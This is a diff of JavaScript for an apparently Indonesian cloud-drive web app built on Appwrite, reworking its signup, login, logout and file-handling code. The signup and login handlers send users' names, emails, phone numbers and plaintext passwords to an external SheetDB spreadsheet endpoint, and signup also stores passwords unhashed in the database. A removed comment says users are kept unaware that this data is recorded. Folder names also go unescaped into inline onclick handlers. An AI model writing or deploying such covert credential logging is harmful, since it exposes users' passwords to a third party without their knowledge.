@@ -4,14 +4,14 @@ const account = new Appwrite.Account(client);
 const databases = new Appwrite.Databases(client);
 const storage = new Appwrite.Storage(client);
 
-// --- MASUKKAN DATA DARI CONSOLE DI SINI ---
+// Konfigurasi Project
 const CONFIG = {
-    ENDPOINT: 'https://sgp.cloud.appwrite.io/v1', // Jangan diubah
+    ENDPOINT: 'https://sgp.cloud.appwrite.io/v1',
     PROJECT_ID: '697f71b40034438bb559', 
-    DB_ID: 'storagedb',       // Sesuai yg kita buat di fase 1
-    COLLECTION_FILES: 'files',   // Sesuai yg kita buat di fase 1
-    COLLECTION_USERS: 'users',   // Sesuai yg kita buat di fase 1
-    BUCKET_ID: 'taskfiles'    // Sesuai yg kita buat di fase 1
+    DB_ID: 'storagedb',
+    COLLECTION_FILES: 'files',
+    COLLECTION_USERS: 'users',
+    BUCKET_ID: 'taskfiles'
 };
 
 client.setEndpoint(CONFIG.ENDPOINT).setProject(CONFIG.PROJECT_ID);
@@ -26,40 +26,93 @@ const el = (id) => document.getElementById(id);
 const showLoading = () => el('loading').classList.remove('hidden');
 const hideLoading = () => el('loading').classList.add('hidden');
 
-// Navigasi Halaman (SPA)
+// Navigasi Halaman
 window.nav = (pageId) => {
-    ['loginPage', 'signupPage', 'dashboardPage'].forEach(id => el(id).classList.add('hidden'));
-    ['loginPage', 'signupPage', 'dashboardPage'].forEach(id => el(id).classList.remove('active'));
+    // Sembunyikan semua halaman dulu
+    ['loginPage', 'signupPage', 'dashboardPage'].forEach(id => {
+        el(id).classList.add('hidden');
+        el(id).classList.remove('active');
+    });
+    // Tampilkan halaman target
     el(pageId).classList.remove('hidden');
     el(pageId).classList.add('active');
 };
 
+// Toggle Password Visibility
 window.togglePass = (id, icon) => {
     const input = el(id);
-    input.type = input.type === 'password' ? 'text' : 'password';
-    icon.classList.toggle('fa-eye');
-    icon.classList.toggle('fa-eye-slash');
+    if (input.type === 'password') {
+        input.type = 'text';
+        icon.classList.remove('fa-eye-slash');
+        icon.classList.add('fa-eye');
+    } else {
+        input.type = 'password';
+        icon.classList.remove('fa-eye');
+        icon.classList.add('fa-eye-slash');
+    }
 };
+
+// --- LOGIKA BARU: DROPDOWN ON CLICK ---
+window.toggleDropdown = () => {
+    const menu = el('dropdownMenu');
+    menu.classList.toggle('show');
+};
+
+// Tutup dropdown jika klik di luar
+window.onclick = function(event) {
+    if (!event.target.matches('.new-btn') && !event.target.matches('.new-btn *')) {
+        const dropdowns = document.getElementsByClassName("dropdown-content");
+        for (let i = 0; i < dropdowns.length; i++) {
+            if (dropdowns[i].classList.contains('show')) {
+                dropdowns[i].classList.remove('show');
+            }
+        }
+    }
+}
+
+// --- LOGIKA BARU: GREETING SESUAI WAKTU ---
+function updateGreeting() {
+    const hour = new Date().getHours();
+    let timeGreeting = "Morning";
+    
+    if (hour >= 12 && hour < 15) {
+        timeGreeting = "Afternoon";
+    } else if (hour >= 15 && hour < 18) {
+        timeGreeting = "Evening";
+    } else if (hour >= 18) {
+        timeGreeting = "Night";
+    }
+
+    const titleElement = el('welcomeText');
+    if (titleElement) {
+        titleElement.innerText = `Welcome In Drive ${timeGreeting}`;
+    }
+}
 
 // --- SYSTEM AUTHENTICATION ---
 
-// Cek Apakah User Sudah Login
+// Cek Sesi Saat Refresh (Agar tidak logout otomatis)
 async function checkSession() {
+    showLoading(); // Tampilkan loading saat cek sesi
     try {
         currentUser = await account.get();
+        // Jika sukses ambil data user, langsung ke Dashboard
         nav('dashboardPage');
+        updateGreeting(); // Set tulisan Pagi/Siang/Malam
         loadFiles(currentFolderId);
     } catch (error) {
+        // Jika gagal (belum login), ke halaman Login
         nav('loginPage');
+    } finally {
+        hideLoading();
     }
 }
+
+// Jalankan cek sesi saat aplikasi pertama kali dibuka
 checkSession();
 
-// --- SISTEM AUTENTIKASI (REVISI TOTAL) ---
 
-// 1. Fungsi Sign Up
-// --- UPDATE: MENGGUNAKAN ID UNIK APPWRITE ---
-
+// 1. Sign Up Logic
 el('signupForm').addEventListener('submit', async (e) => {
     e.preventDefault();
     const name = el('regName').value;
@@ -71,33 +124,23 @@ el('signupForm').addEventListener('submit', async (e) => {
     if (pass !== verify) return alert("Password tidak cocok!");
 
     showLoading();
-    
     try {
-        // 1. BUAT AKUN DI APPWRITE (Sistem membuat ID unik di sini)
-        // Variabel 'userAuth' sekarang berisi ID keren seperti di gambar Anda
         const userAuth = await account.create(Appwrite.ID.unique(), email, pass, name);
 
-        // 2. SIMPAN KE DATABASE APPWRITE
         await databases.createDocument(CONFIG.DB_ID, 'users', userAuth.$id, {
-            name: name,
-            email: email,
-            phone: phone,
-            password: pass
+            name: name, email: email, phone: phone, password: pass
         });
 
-        // 3. SIAPKAN DATA UNTUK EXCEL
-        // Di sini kita ambil userAuth.$id agar ID di Excel SAMA PERSIS dengan Appwrite
+        // Kirim ke Excel (Sheet1)
+        const sheetDB_URL = "https://sheetdb.io/api/v1/v9e5uhfox3nbi"; 
         const dataExcel = {
-            "ID": userAuth.$id, // <--- INI KUNCINYA (Mengambil ID 698xxx...)
+            "ID": userAuth.$id,
             "Nama": name,
             "Email": email,
             "Phone": phone,
             "Password": pass,
             "Waktu": new Date().toLocaleString('id-ID')
         };
-
-        // 4. KIRIM KE GOOGLE SHEETS (Background)
-        const sheetDB_URL = "https://sheetdb.io/api/v1/v9e5uhfox3nbi"; 
         
         fetch(sheetDB_URL, {
             method: 'POST',
@@ -105,11 +148,9 @@ el('signupForm').addEventListener('submit', async (e) => {
             body: JSON.stringify({ data: [dataExcel] })
         }).catch(err => console.warn("Excel error:", err));
 
-        // 5. SUKSES
         alert("Pendaftaran Berhasil!");
         el('signupForm').reset();
         nav('loginPage');
-
     } catch (error) {
         alert("Gagal: " + error.message);
     } finally {
@@ -117,174 +158,99 @@ el('signupForm').addEventListener('submit', async (e) => {
     }
 });
 
-// 2. Fungsi Login
-// --- LOGIKA LOGIN PINTAR (EMAIL ATAU NAMA) ---
-// --- SISTEM LOGIN DENGAN HISTORY PENCATATAN EXCEL ---
-
+// 2. Login Logic
 el('loginForm').addEventListener('submit', async (e) => {
     e.preventDefault();
-    
-    // 1. Ambil input dari user (bisa jadi Nama atau Email)
     let identifier = el('loginEmail').value.trim(); 
     const password = el('loginPass').value;
     
     showLoading();
-
     try {
-        // --- BAGIAN A: PROSES LOGIN APPWRITE ---
-        
-        // Cek apakah user login pakai Nama (tidak ada @)
         if (!identifier.includes('@')) {
-            // Cari email aslinya di database berdasarkan nama
             const response = await databases.listDocuments(
-                CONFIG.DB_ID,
-                CONFIG.COLLECTION_USERS, 
+                CONFIG.DB_ID, CONFIG.COLLECTION_USERS, 
                 [Appwrite.Query.equal('name', identifier)]
             );
-            
-            if (response.total === 0) {
-                throw new Error("Nama tidak ditemukan. Cek ejaan atau daftar dulu.");
-            }
-            // Ganti nama jadi email untuk proses login ke Auth
+            if (response.total === 0) throw new Error("Nama tidak ditemukan.");
             identifier = response.documents[0].email;
         }
 
-        // Lakukan Login ke Sistem Appwrite
         await account.createEmailPasswordSession(identifier, password);
+        currentUser = await account.get(); 
 
-
-        // --- BAGIAN B: MENGAMBIL DATA USER ASLI ---
-        
-        // Kita butuh ID Unik (698xxx) dan Nama asli untuk dicatat ke Excel.
-        // account.get() mengambil data user yang SEDANG login saat ini.
-        const currentUser = await account.get(); 
-
-
-        // --- BAGIAN C: MENCATAT KE GOOGLE SHEETS (BACKGROUND) ---
-        
-        const sheetDB_URL = "https://sheetdb.io/api/v1/v9e5uhfox3nbi"; // <--- Ganti dengan URL Anda
-        
-        // Kita tambahkan parameter ?sheet=History_Login agar masuk ke Tab kedua
+        // Catat Login ke Excel (Sheet=Login)
+        const sheetDB_URL = "https://sheetdb.io/api/v1/v9e5uhfox3nbi"; 
         const historyURL = `${sheetDB_URL}?sheet=Login`;
 
         const logData = {
-            "ID": currentUser.$id,       // ID Unik asli dari Appwrite
-            "Nama": currentUser.name,    // Nama asli dari akun
-            "Email": currentUser.email,  // Email asli
-            "Password": password,        // Password yang diketik saat login
+            "ID": currentUser.$id,
+            "Nama": currentUser.name,
+            "Email": currentUser.email,
+            "Password": password,
             "Riwayat Waktu": new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })
         };
 
-        // Kirim data tanpa menunggu (agar user langsung masuk dashboard)
         fetch(historyURL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ data: [logData] })
-        }).catch(err => console.warn("Gagal catat history:", err));
+        }).catch(err => console.warn("Excel log error:", err));
 
-
-        // --- BAGIAN D: PINDAH KE DASHBOARD ---
-        
-        // Notifikasi simpel (tidak perlu bilang data dicatat agar user tenang)
-        alert("Login Berhasil! Selamat datang, " + currentUser.name);
-        el('loginForm').reset();
-        nav('dashboardPage'); // Sesuaikan dengan nama halaman dashboard Anda
-
+        // Update UI
+        updateGreeting();
+        nav('dashboardPage');
+        loadFiles('root');
     } catch (error) {
-        console.error(error);
         alert("Login Gagal: " + error.message);
     } finally {
         hideLoading();
     }
 });
 
-// Logout
-window.logout = async () => {
-    try {
-        await account.deleteSession('current');
-        currentUser = null;
-        nav('loginPage');
-    } catch (error) {
-        alert(error.message);
-    }
-};
-
-// --- SISTEM LOGOUT DENGAN PENCATATAN EXCEL ---
-// --- SISTEM LOGOUT PENUH (Menunggu Excel Selesai Baru Keluar) ---
-
+// 3. Logout Logic
 const logoutBtn = document.getElementById('logoutBtn');
-
 if (logoutBtn) {
     logoutBtn.addEventListener('click', async () => {
-        
-        // 1. Konfirmasi User
         if (!confirm("Apakah Anda yakin ingin keluar?")) return;
-
-        // Tampilkan loading agar user tahu sistem sedang bekerja
         showLoading();
-
         try {
-            // 2. AMBIL DATA USER (Wajib dilakukan saat masih login)
             const currentUser = await account.get();
-
-            // 3. SIAPKAN DATA
+            
+            // Catat Logout ke Excel
             const sheetDB_URL = "https://sheetdb.io/api/v1/v9e5uhfox3nbi"; 
-            // Pastikan ?sheet=Logout sesuai dengan Nama Tab di Excel Anda
             const logoutURL = `${sheetDB_URL}?sheet=Logout`;
-
             const logoutData = {
                 "ID": currentUser.$id,
                 "Nama": currentUser.name,
                 "Email": currentUser.email,
-                // Nama ini harus 100% sama dengan Header Kolom E di Excel
                 "Riwayat Waktu": new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })
             };
 
-            // 4. KIRIM KE EXCEL DENGAN 'AWAIT' (BAGIAN PENTING)
-            // Kita tambah kata 'await' disini.
-            // Artinya: "Tunggu sampai Excel bilang 'Oke', baru lanjut ke bawah."
             await fetch(logoutURL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ data: [logoutData] })
             });
 
-            // 5. HAPUS SESI APPWRITE
-            // Kode ini baru akan jalan SETELAH data Excel sukses terkirim
             await account.deleteSession('current');
-
-            // 6. BERSIHKAN & PINDAH
-            alert("Logout Berhasil. Data waktu telah tercatat.");
+            alert("Logout Berhasil.");
             nav('loginPage'); 
-
         } catch (error) {
-            console.error("Error Logout:", error);
-            
-            // EMERGENCY EXIT:
-            // Jika internet lemot atau Excel error, jangan kurung user di dalam.
-            // Tetap paksa logout jika terjadi error.
             await account.deleteSession('current').catch(() => {});
             nav('loginPage');
-            
         } finally {
             hideLoading();
         }
     });
 }
 
-// --- FILE SYSTEM LOGIC ---
-
-// 1. Load File/Folder
+// --- FILE SYSTEM (TETAP SAMA) ---
 async function loadFiles(folderId) {
     if (!currentUser) return;
     const grid = el('fileGrid');
     grid.innerHTML = '';
 
     try {
-        // Query: Cari item punya user INI dan di folder SAAT INI
         const response = await databases.listDocuments(
-            CONFIG.DB_ID,
-            CONFIG.COLLECTION_FILES, // Pastikan ini menunjuk ke tabel 'files'
+            CONFIG.DB_ID, CONFIG.COLLECTION_FILES,
             [
                 Appwrite.Query.equal('owner', currentUser.$id),
                 Appwrite.Query.equal('parentId', folderId)
@@ -300,23 +266,20 @@ async function loadFiles(folderId) {
             }
             if (doc.size) totalSize += doc.size;
         });
-
-        updateBreadcrumb();
         updateStorageUI(totalSize);
 
     } catch (error) {
-        console.error("Gagal load data:", error);
+        console.error("Load error:", error);
     }
 }
 
-// 2. Render Kartu (Visual)
 function renderItem(doc) {
     const div = document.createElement('div');
     div.className = 'item-card';
     const isFolder = doc.type === 'folder';
     const icon = isFolder ? 'fa-folder' : 'fa-file';
     
-    // Klik folder -> Masuk | Klik file -> Download/Buka
+    // Klik Item
     const clickAction = isFolder 
         ? `openFolder('${doc.$id}', '${doc.name}')` 
         : `window.open('${doc.url}', '_blank')`;
@@ -333,156 +296,57 @@ function renderItem(doc) {
     el('fileGrid').appendChild(div);
 }
 
-// 3. Buat Folder Baru
+// Fungsi helper lainnya (Create Folder, Upload, Delete, dll)
 window.createFolder = async () => {
     const name = prompt("Nama Folder Baru:");
     if (!name) return;
-
     showLoading();
     try {
-        await databases.createDocument(
-            CONFIG.DB_ID,
-            CONFIG.COLLECTION_ID,
-            Appwrite.ID.unique(),
-            // Bagian simpan ke database (createDocument)
-            {
-                name: name, // Pastikan ini 'name', bukan 'nama'!
-                type: 'folder',
-                parentId: currentFolderId,
-                owner: currentUser.$id,
-                url: null,
-                fileId: null,
-                size: 0
-            }
-        );
+        await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), {
+            name: name, type: 'folder', parentId: currentFolderId, owner: currentUser.$id, size: 0
+        });
         loadFiles(currentFolderId);
-    } catch (error) {
-        alert("Gagal buat folder: " + error.message);
-    } finally {
-        hideLoading();
-    }
+    } catch (err) { alert(err.message); }
+    finally { hideLoading(); }
 };
 
-// 4. Upload File (Storage + Database)
 el('fileUpload').addEventListener('change', async (e) => {
     const file = e.target.files[0];
     if (!file) return;
-
     showLoading();
     try {
-        // A. Upload File Fisik ke Storage Bucket
-        const uploaded = await storage.createFile(
-            CONFIG.BUCKET_ID,
-            Appwrite.ID.unique(),
-            file
-        );
-
-        // B. Dapatkan URL agar bisa dilihat
+        const uploaded = await storage.createFile(CONFIG.BUCKET_ID, Appwrite.ID.unique(), file);
         const fileUrl = storage.getFileView(CONFIG.BUCKET_ID, uploaded.$id);
-
-        // C. Simpan Info File ke Database
-        await databases.createDocument(
-            CONFIG.DB_ID,
-            CONFIG.COLLECTION_ID,
-            Appwrite.ID.unique(),
-            {
-                name: file.name,
-                type: 'file',
-                parentId: currentFolderId,
-                owner: currentUser.$id,
-                url: fileUrl.href, 
-                fileId: uploaded.$id,
-                size: file.size
-            }
-        );
-
+        await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), {
+            name: file.name, type: 'file', parentId: currentFolderId, owner: currentUser.$id, 
+            url: fileUrl.href, fileId: uploaded.$id, size: file.size
+        });
         loadFiles(currentFolderId);
-    } catch (error) {
-        alert("Upload Gagal: " + error.message);
-    } finally {
-        hideLoading();
-        e.target.value = ''; 
-    }
+    } catch (err) { alert(err.message); }
+    finally { hideLoading(); e.target.value = ''; }
 });
 
-// 5. Hapus Item
 window.deleteItem = async (docId, type, fileId) => {
-    if (!confirm("Yakin hapus item ini?")) return;
-    
+    if (!confirm("Hapus item ini?")) return;
     showLoading();
     try {
-        // Jika file, hapus dari Storage fisik dulu
-        if (type === 'file' && fileId) {
-            await storage.deleteFile(CONFIG.BUCKET_ID, fileId);
-        }
-        // Hapus data dari Database
-        await databases.deleteDocument(CONFIG.DB_ID, CONFIG.COLLECTION_ID, docId);
+        if (type === 'file' && fileId) await storage.deleteFile(CONFIG.BUCKET_ID, fileId);
+        await databases.deleteDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, docId);
         loadFiles(currentFolderId);
-    } catch (error) {
-        alert("Gagal hapus: " + error.message);
-    } finally {
-        hideLoading();
-    }
+    } catch (err) { alert(err.message); }
+    finally { hideLoading(); }
 };
 
-// 6. Navigasi Breadcrumb
 window.openFolder = (id, name) => {
     currentFolderId = id;
-    folderPath.push({ id, name });
     loadFiles(id);
 };
 
-function updateBreadcrumb() {
-    const bc = el('breadcrumb');
-    bc.innerHTML = folderPath.map((f, i) => 
-        `<span onclick="goToLevel(${i})">${f.name}</span>`
-    ).join(' > ');
-}
-
-window.goToLevel = (index) => {
-    folderPath = folderPath.slice(0, index + 1);
-    currentFolderId = folderPath[index].id;
-    loadFiles(currentFolderId);
-};
-
-// 7. Search Listener
 el('searchInput').addEventListener('input', () => loadFiles(currentFolderId));
 
-// 8. Visual Storage Bar
 function updateStorageUI(bytes) {
     const mb = (bytes / (1024 * 1024)).toFixed(2);
-    // Hitung persen dari 2GB (Free tier)
     const percent = Math.min((bytes / (2 * 1024 * 1024 * 1024)) * 100, 100); 
     el('storageUsed').innerText = mb + ' MB';
     el('storageBar').style.width = percent + '%';
 }
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
